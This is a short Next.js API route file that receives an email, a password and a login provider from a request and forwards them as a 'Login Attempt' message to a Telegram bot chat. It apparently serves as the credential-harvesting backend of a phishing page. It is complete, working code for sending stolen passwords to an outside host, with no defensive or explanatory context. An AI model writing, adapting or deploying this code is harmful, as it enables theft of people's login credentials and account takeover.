// app/api/send-telegram/route.ts
import { NextResponse } from "next/server";

export async function POST(req: Request) {
  const { email, password, provider } = await req.json();

  const message = `🔐 *Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌐 Provider: ${provider}`;

  const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const telegramRes = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    const data = await telegramRes.json();

    if (!telegramRes.ok) {
      console.error("Telegram API error:", data);
      return NextResponse.json({ error: data.description }, { status: 500 });
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Telegram network error:", error);
    return NextResponse.json({ error: "Telegram network error" }, { status: 500 });
  }
}
